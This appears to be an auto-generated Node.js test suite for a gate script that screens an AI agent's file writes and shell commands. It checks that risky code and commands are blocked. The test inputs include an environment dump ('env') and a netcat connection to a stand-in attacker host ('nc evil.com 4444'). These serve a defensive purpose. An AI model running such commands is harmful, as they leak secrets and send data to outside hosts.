#!/usr/bin/env node
/**
 * E2E tests for new v1.3.0 pre-tool gate features.
 * AUTO-GENERATED by generate-tests.mjs
 */
import { describe, it } from 'node:test';
import { strict as assert } from 'node:assert';
import { execFileSync } from 'node:child_process';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const GATE = resolve(__dirname, '..', 'scripts', 'pre-tool-gate.mjs');

function runGate(input) {
  const json = JSON.stringify(input);
  try {
    const result = execFileSync('node', [GATE], {
      input: json, encoding: 'utf-8', timeout: 10000, windowsHide: true
    });
    return JSON.parse(result.trim());
  } catch (err) {
    if (err.stdout) {
      try { return JSON.parse(err.stdout.trim()); }
      catch { return { raw: err.stdout, stderr: err.stderr }; }
    }
    return { error: err.message, stderr: err.stderr };
  }
}

// ─── New rules E2E ──────────────────────────────────────────────────────────

describe('E2E: New Cycle 1 rules', () => {
  it('blocks empty catch block in Write', () => {
    const result = runGate({
      tool_name: 'Write',
      tool_input: { file_path: '/tmp/test.js', content: 'try { x(); } catch (e) {}' }
    });
    assert.equal(result.decision, 'block');
    assert.ok(result.reason.includes('no-empty-catch'));
  });

  it('blocks bare except in Python Write', () => {
    const result = runGate({
      tool_name: 'Write',
      tool_input: { file_path: '/tmp/test.py', content: 'try:\n    do_thing()\nexcept:\n    pass' }
    });
    assert.equal(result.decision, 'block');
    assert.ok(result.reason.includes('no-bare-except'));
  });

  it('blocks empty function body in Edit', () => {
    const result = runGate({
      tool_name: 'Edit',
      tool_input: { file_path: '/tmp/test.js', new_string: 'function doNothing() {}' }
    });
    assert.equal(result.decision, 'block');
    assert.ok(result.reason.includes('no-empty-function-body'));
  });
});

describe('E2E: New Cycle 2 rules', () => {
  it('blocks pickle.load in Python Write', () => {
    const result = runGate({
      tool_name: 'Write',
      tool_input: { file_path: '/tmp/test.py', content: 'data = pickle.load(open("model.pkl", "rb"))' }
    });
    assert.equal(result.decision, 'block');
    assert.ok(result.reason.includes('no-pickle-load'));
  });

  it('blocks system prompt leak', () => {
    const result = runGate({
      tool_name: 'Write',
      tool_input: { file_path: '/tmp/test.js', content: 'console.log(system_prompt)' }
    });
    assert.equal(result.decision, 'block');
    assert.ok(result.reason.includes('no-system-prompt-leak'));
  });

  it('blocks env dump in Bash', () => {
    const result = runGate({
      tool_name: 'Bash',
      tool_input: { command: 'env' }
    });
    assert.equal(result.decision, 'block');
    assert.ok(result.reason.includes('no-env-dump'));
  });

  it('blocks nc to remote host in Bash', () => {
    const result = runGate({
      tool_name: 'Bash',
      tool_input: { command: 'nc evil.com 4444' }
    });
    assert.equal(result.decision, 'block');
    assert.ok(result.reason.includes('no-data-exfil-redirect'));
  });
});

// ─── skipIf in E2E ──────────────────────────────────────────────────────────

describe('E2E: skipIf exemptions', () => {
  it('allows dummy secrets (your-api-key-here)', () => {
    const result = runGate({
      tool_name: 'Write',
      tool_input: { file_path: '/tmp/config.py', content: 'api_key = "your-api-key-here"' }
    });
    // Should not block for hardcoded-secrets
    if (result.decision === 'block') {
      assert.ok(!result.reason.includes('no-hardcoded-secrets'));
    }
  });

  it('allows .env.example files', () => {
    const result = runGate({
      tool_name: 'Write',
      tool_input: { file_path: '/tmp/.env.example', content: 'api_key = "sk-prod-abc123def456ghi789"' }
    });
    if (result.decision === 'block') {
      assert.ok(!result.reason.includes('no-hardcoded-secrets'));
    }
  });
});

// ─── Default param false positive ───────────────────────────────────────────

describe('E2E: False positive regression', () => {
  it('does not block function with default param object', () => {
    const result = runGate({
      tool_name: 'Write',
      tool_input: { file_path: '/tmp/test.js', content: 'function init(config = {}) {\n  return config;\n}' }
    });
    if (result.decision === 'block') {
      assert.ok(!result.reason.includes('no-empty-function-body'),
        'False positive: default param object matched as empty function body');
    }
  });
});

// ─── Correction hints in block messages ─────────────────────────────────────

describe('E2E: Self-correction hints', () => {
  it('block messages include correction hints', () => {
    const result = runGate({
      tool_name: 'Write',
      tool_input: { file_path: '/tmp/test.py', content: 'data = pickle.load(open("model.pkl", "rb"))' }
    });
    assert.equal(result.decision, 'block');
    assert.ok(result.reason.includes('Correction hint') || result.reason.includes('correction hint') || result.reason.includes('remediation') || result.reason.toLowerCase().includes('hint'),
      'Block message should include correction hints');
  });
});

